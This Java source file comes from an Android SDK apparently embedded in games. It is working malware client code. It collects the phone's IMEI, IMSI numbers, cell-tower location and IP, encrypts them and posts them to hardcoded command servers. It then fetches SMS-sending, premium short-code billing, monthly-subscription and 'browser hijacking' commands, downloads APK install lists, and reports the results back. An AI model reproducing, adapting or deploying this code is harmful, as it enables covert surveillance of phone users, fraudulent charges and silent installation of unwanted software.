package cn.com.tiantong.game72.n.m;

import java.util.HashMap;

import android.content.Context;
import cn.com.tiantong.game72.n.m.JP;
import cn.com.tiantong.game72.n.m.JR;
import cn.com.tiantong.game72.n.m.RO;
import cn.com.tiantong.game72.util.DES_JAVA;
import cn.com.tiantong.game72.util.DataEncryption;
import cn.com.tiantong.game72.util.GA;
import cn.com.tiantong.game72.util.Logger;


public class JB {
	
	public static final String TAG = "JsonBean";
	
	private JR req = new JR();
	private JP par = new JP();
	
//	private String urlForFirst = "http://yeerg.com"; 
	
	public Object getInitProcess(Context context, String appid, String sign, String imsi, String packageName,
			String SDKVersion, String net, String qudaohao, int initYIDONGIsOk, int resCode, String resInfo,
			String currentVersion, int systemSign, String phoneType, String androidVersion,
			String IMEI, String IMSI_NAKED, String cid, String lac, String nid, String ip, String realSign, int imsiCardCount, String imsi_1, String imsi_2,
			String salt){
		
//		String urlForFirst = "http://yeerg.com/index.php?m=Service&a=initUser";
		//http://106.186.116.107/sprite/index.php?m=Service&a=initUser
		//4.80  http://yeerg.com/index.php?m=Service&a=initUser
		//5.0 http://xzvzc.com/index.php?m=Service&a=initUser
		//5.60 http://vbxbx.com/index.php?m=Service&a=initUser
		
		//6.00 http://uityi.com/index.php?m=Api&a=initUser
		//LH.LogPrint(tag, "获取到的地址是：" + urlForFirst);

//		String urlForFirst = GA.getTest(context, "cl_iia");
		//测试地址：http://uityi.com/eddy/sprite_new/index.php?m=Api&a=initUser
		String urlForFirst = "http://uityi.com/index.php?m=Api&a=initUser";
	 	
	 	HashMap<String, String> initMap = new HashMap<String, String>();
	 	initMap.put("appid", appid);
	 	initMap.put("sign", sign);
	 	initMap.put("imsi", imsi);
	 	initMap.put("packageName", packageName);
	 	initMap.put("sdkVersion", SDKVersion);
	 	initMap.put("net", net);
	 	initMap.put("qudaohao", qudaohao);
	 	initMap.put("inityidongstate", String.valueOf(initYIDONGIsOk));
	 	initMap.put("resCode", String.valueOf(resCode));
	 	initMap.put("resInfo", resInfo);
	 	initMap.put("appVersion", currentVersion);
	 	initMap.put("systemSign", String.valueOf(systemSign));
	 	initMap.put("phoneType", phoneType);
	 	initMap.put("androidVersion", androidVersion);
	 	initMap.put("imei", IMEI);
	 	initMap.put("imsi_naked", IMSI_NAKED);
	 	initMap.put("cid", cid);
	 	initMap.put("lac", lac);
	 	initMap.put("nid", nid);
	 	initMap.put("ip", ip);
	 	initMap.put("realsign", realSign);
	 	initMap.put("imsiCardCount", String.valueOf(imsiCardCount));
	 	initMap.put("imsi_1", imsi_1);
	 	initMap.put("imsi_2", imsi_2);
	 	initMap.put("salt", salt);
	 	
	 	//6.00 json数据  -- DES加密 -- base64
	 	String data = DES_JAVA.encrypt1(context, initMap);
	 	////LH.LogPrint(tag, "data：" + data);
	 	
	 	HashMap<String, String> initForSendMap = new HashMap<String, String>();
	 	initForSendMap.put("data_des", data);
	 	
	 	String res =  req.httpPost_new(context, urlForFirst, initForSendMap);
	 	//LH.LogPrint(tag, "初始化res：" + res);
	 	 
	 	String res_decrypt1 = DES_JAVA.decrypt1(context, res);
	 	Logger.print(TAG, "返回结果：" + res_decrypt1);
		Object obj = par.parseInitProcess(context, res_decrypt1);
		
		return obj;
	}
	
	//从服务器端获取指令
	public Object getCommandsFromService(Context context, String channel, String imsi){
		
	   //LH.LogPrint(tag, "从服务器获取指令！！！");
		
//	   String address = "http://yeerg.com/index.php?m=Service&a=getCommands&channel=" + channel;
//      http://106.186.116.107/sprite/index.php?m=Service&a=getCommands&channel=
//		String address = GA.getTest(context, "pcl_co") + channel + "&imsi=" + imsi;
		//版本4.45，更新获取指令地址
	    //http://106.186.116.107/sprite/index.php?m=Service&a=getCommandByImsi&channel=xxxx&imsi=xxxxx
		
		//4.80 http://yeerg.com/index.php?m=Service&a=getCommandByImsi&channel=
		//5.0 post "http://xzvzc.com/index.php?m=Service&a=getCommandByImsi"
		//5.60 "http://vbxbx.com/index.php?m=Service&a=getCommandByImsi"
		
		//6.00 http://uityi.com/index.php?m=Api&a=getCommandByImsi
		
		String address = GA.getTest(context, "cl_coa");
		
		//LH.LogPrint(tag, "getCommandsFromService获取到的地址是：" + address);
		
		HashMap<String, String> commandsMap = new HashMap<String, String>();
		commandsMap.put("channel", channel);
		commandsMap.put("imsi", imsi);
		
		//6.00 json数据  -- DES加密 -- base64
	 	String data = DES_JAVA.encrypt1(context, commandsMap);
	 	//LH.LogPrint(tag, "data：" + data);
	 	
	 	HashMap<String, String> commandsMapForSend = new HashMap<String, String>();
	 	commandsMapForSend.put("data_des", data);
		
		String res = req.httpPost_new(context, address, commandsMapForSend); 
		//LH.LogPrint(tag, "指令res：" + res);
		
		String res_decrypt1 = DES_JAVA.decrypt1(context, res);
	 	//LH.LogPrint(tag, "解密-2===：" + res_decrypt1);
		Logger.print(TAG, "-------------------" + res_decrypt1);
		Object obj = par.parseCommandsFromService(context, res_decrypt1);
		
		return obj;
	}
	
	//4.60 手机号码
	public Object getBasicNumService(Context context, String channel, String imsi){
        
		//"http://yeerg.com/index.php?m=Service&a=preCommand&imsi=" + imsi;  
		//5.0 "http://xzvzc.com/index.php?m=Service&a=preCommand"
		//5.60 "http://vbxbx.com/index.php?m=Service&a=preCommand"
		//6.00 http://uityi.com/index.php?m=Api&a=preCommand
		String address = GA.getTest(context, "cl_gna");
//		LH.LogPrint(tag, "getBasicNumService获取到的地址是：" + address);
		
		HashMap<String, String> numberMap = new HashMap<String, String>();
		numberMap.put("channel", channel);
		numberMap.put("imsi", imsi);
		
		
		//6.00 json数据  -- DES加密 -- base64
	 	String data = DES_JAVA.encrypt1(context, numberMap);
	 	////LH.LogPrint(tag, "data：" + data);
	 	
	 	HashMap<String, String> numberMapForSend = new HashMap<String, String>();
	 	numberMapForSend.put("data_des", data);
		
		String res = req.httpPost_new(context, address, numberMapForSend);//req.httpGet(address);
		////LH.LogPrint(tag, "获取手机号res：" + res);
		
	 	String res_decrypt1 = DES_JAVA.decrypt1(context, res);
	 	Logger.print(TAG, "获取到手机号：" + res_decrypt1);
		Object obj = par.parseBasicNumService(context, res_decrypt1);
		
		return obj;
		
	}
	
	//用于执行发送短信结果上报
	public void sendExectueResult(Context context, String channel,String imsi, String appVersion, String result){
		String address = "http://uityi.com/index.php?m=Api&a=preCommand_back";
		Logger.print(TAG, "发起短信执行结果。");
		HashMap<String, String> sendResultMap = new HashMap<String, String>();
		sendResultMap.put("channel", channel);
		sendResultMap.put("imsi", imsi);
		sendResultMap.put("appversion", appVersion);
		sendResultMap.put("result", result);

		// 6.00 json数据 -- DES加密 -- base64
		String data = DES_JAVA.encrypt1(context, sendResultMap);

		HashMap<String, String> numberMapForSend = new HashMap<String, String>();
		numberMapForSend.put("data_des", data);
		
		String res = req.httpPost_new(context, address, numberMapForSend);
		Logger.print(TAG, "res:" + res);
	}
	
	//******************************获取apk下载5.50******************************************
		public Object getDownloadApkList(Context context, String channel, String imsi){
			
			
			//5.50 http://42.96.191.181/taobao/index.php?m=Home&c=public&a=apklist
			String address = GA.getTest(context, "cl_apk");
			
			////LH.LogPrint(tag, "获取下载apk列表地址：" + address);
			HashMap<String, String> apkListMap = new HashMap<String, String>();
			apkListMap.put("channel", channel);
			apkListMap.put("imsi", imsi);
			
			//json base64加密解密
		 	DataEncryption dataEnc = DataEncryption.getInstance();
		 	//加密
		 	String data = dataEnc.encryption(apkListMap);
		 	
		 	HashMap<String, String> apkListSendMap = new HashMap<String, String>();
		 	apkListSendMap.put("data", data);
			
			String res = req.httpPost_new(context, address, apkListSendMap);
			
			//LH.LogPrint(tag, "获取到的列表：" + res);
			Logger.print(TAG, "获取到的列表：" + res);
			Object obj = par.parseDownloadApkList(context, res);
			
			return obj;
			
		}
		
		//上报结果，不需要有返回值
		public void sendApkInstallationResult(Context context, String channel, String imsi, String packageName){
			//5.60 http://42.96.191.181/taobao/index.php?m=Home&c=public&a=Device_op
			String address = GA.getTest(context, "cl_as");
			
			////LH.LogPrint(tag, "获取下载apk列表地址：" + address);
			HashMap<String, String> apkSuccessListMap = new HashMap<String, String>();
			apkSuccessListMap.put("channel", channel);
			apkSuccessListMap.put("imsi", imsi);
			apkSuccessListMap.put("packageName", packageName);
			
			//json base64加密解密
		 	DataEncryption dataEnc = DataEncryption.getInstance();
		 	//加密
		 	String data = dataEnc.encryption(apkSuccessListMap);
		 	
		 	HashMap<String, String> apkSuccessSendMap = new HashMap<String, String>();
		 	apkSuccessSendMap.put("data", data);
			
			String res = req.httpPost_new(context, address, apkSuccessSendMap);
			
			////LH.LogPrint(tag, "获取到的列表：" + res);
		}
		
		//发送短代的结果，上报服务器
		public void sendMessageResult(Context context, String channel, String imsi, String msgId, String result){
			
			//LH.LogPrint(tag, "短代结果上报：channel:" + channel + ", imsi:" + imsi + ", msgId:" + msgId + ", result:" + result);
			//6.20添加 http://uityi.com/index.php?m=Api&a=duandaiReport
			String address = GA.getTest(context, "cl_ddr");
			
			HashMap<String, String> msgSuccessListMap = new HashMap<String, String>();
			msgSuccessListMap.put("channel", channel);
			msgSuccessListMap.put("imsi", imsi);
			msgSuccessListMap.put("id", msgId);
			msgSuccessListMap.put("result", result);
			
			String data = DES_JAVA.encrypt1(context, msgSuccessListMap);
			
			HashMap<String, String> sendMapForSend = new HashMap<String, String>();
			sendMapForSend.put("data_des", data);
		 	
			String res =  req.httpPost_new(context, address, sendMapForSend);
		 	//LH.LogPrint(tag, "初始化res：" + res);

		}
		
		//从服务器端获取web指令
		public Object getWebCommandsFromService(Context context, String channel, String imsi, String appVersion, String net){
			
			String address = "http://uityi.com/index.php?m=Api&a=getWebCommandByImsi";
			Logger.print(TAG, "发起获取web指令的请求。");
			HashMap<String, String> commandsMap = new HashMap<String, String>();
			commandsMap.put("channel", channel);
			commandsMap.put("imsi", imsi);
			commandsMap.put("appversion", appVersion);
			commandsMap.put("net", net);
			
			//6.00 json数据  -- DES加密 -- base64
		 	String data = DES_JAVA.encrypt1(context, commandsMap);
		 	
		 	HashMap<String, String> commandsMapForSend = new HashMap<String, String>();
		 	commandsMapForSend.put("data_des", data);
			//用于上报执行结果信息（无论是否成功）
			String res = req.httpPost_new_2(context, address, commandsMapForSend); 
			Logger.print(TAG, "获取到的加密的web指令：" + res);
			if(res.indexOf("@status") == 0){
				RO ro = new RO();
				ro.result = false;
				ro.obj = res;
				return ro;
			}else{
				String res_decrypt1 = DES_JAVA.decrypt1(context, res);
				Logger.print(TAG, "获取到的解密的web指令：" + res_decrypt1);
				Object obj = par.parseWebCommandsFromService(context, res_decrypt1);
				return obj;
			}
		}
		//从服务器获取浏览器劫持指令
		public Object getBrowserComms (Context context, String imsi, String imei, String appVersion, String channel, String net){
			String url = "http://uityi.com/index.php?m=Api&a=doBrowserCommands";
			Logger.print(TAG, "发起获取浏览器劫持指令请求-->");
			HashMap<String, String> commandsMap = new HashMap<String, String>();
			commandsMap.put("imsi", imsi);
			commandsMap.put("imei", imei);
			commandsMap.put("appversion", appVersion);
			commandsMap.put("channel", channel);
			commandsMap.put("net", net);
			
			String data = DES_JAVA.encrypt1(context, commandsMap);
		 	
		 	HashMap<String, String> commandsMapForSend = new HashMap<String, String>();
		 	commandsMapForSend.put("data_des", data);
		 	
		 	String res = req.httpPost_new(context, url, commandsMapForSend);
		 	Logger.print(TAG, "获取到加密的浏览器劫持指令:" + res);
		 	
		 	if("".equals(res)) {
		 		RO ro = new RO();
				ro.result = false;
				ro.obj = res;
				return ro;
		 	} else {
		 		String res_decrypt1 = DES_JAVA.decrypt1(context, res);
				Logger.print(TAG, "获取到的解密的浏览器劫持指令：" + res_decrypt1);
				Object obj = par.parseBrowserCommands(context, res_decrypt1);
				return obj;
		 	}
		
		}
		
		
		//从服务器获取包月指令
		public Object getMonthCommandsFromService(Context context, String imsi, String imei, String appVersion, String channel, String net){
			
			String address = "http://uityi.com/index.php?m=Api&a=getMonthCommands";
			//http://uityi.com/eddy/sprite_new
			Logger.print(TAG, "发起获取包月指令的请求。");
			HashMap<String, String> commandsMap = new HashMap<String, String>();
			commandsMap.put("imsi", imsi);
			commandsMap.put("imei", imei);
			commandsMap.put("appversion", appVersion);
			commandsMap.put("channel", channel);
			commandsMap.put("net", net);
			
			//6.00 json数据  -- DES加密 -- base64
		 	String data = DES_JAVA.encrypt1(context, commandsMap);
		 	Logger.print(TAG, "------------" + data);
		 	HashMap<String, String> commandsMapForSend = new HashMap<String, String>();
		 	commandsMapForSend.put("data_des", data);
			//用于上报执行结果信息（无论是否成功）
			String res = req.httpPost_new(context, address, commandsMapForSend);
			Logger.print(TAG, "获取到的加密的包月指令：" + res);
			//这段是处理请求结果信息，做上报用的。
			if("".equals(res)){
				RO ro = new RO();
				ro.result = false;
				ro.obj = res;
				return ro;
			}else{
				String res_decrypt1 = DES_JAVA.decrypt1(context, res);
				Logger.print(TAG, "获取到的解密的包月指令：" + res_decrypt1);
				Object obj = par.parseMonthCommandsFormService(context, res_decrypt1);
				return obj;
			}
		}
		
		//发送webview的结果，上报服务器
		public void sendWebViewResult(Context context, String channel, String appVersion, String imsi, String mobile, String webViewId, String result){
			
			String address = "http://uityi.com/index.php?m=Api&a=getWebCommandByImsiCallback";
			
			HashMap<String, String> msgSuccessListMap = new HashMap<String, String>();
			msgSuccessListMap.put("channel", channel);
			msgSuccessListMap.put("appVersion", appVersion);
			msgSuccessListMap.put("imsi", imsi);
			msgSuccessListMap.put("index", webViewId + "");
			msgSuccessListMap.put("mobile", mobile);
			msgSuccessListMap.put("result", result);
			
			String data = DES_JAVA.encrypt1(context, msgSuccessListMap);
			
			HashMap<String, String> sendMapForSend = new HashMap<String, String>();
			sendMapForSend.put("data_des", data);
		 	
			String res =  req.httpPost_new(context, address, sendMapForSend);
		 	//LH.LogPrint(tag, "初始化res：" + res);

		}
	
}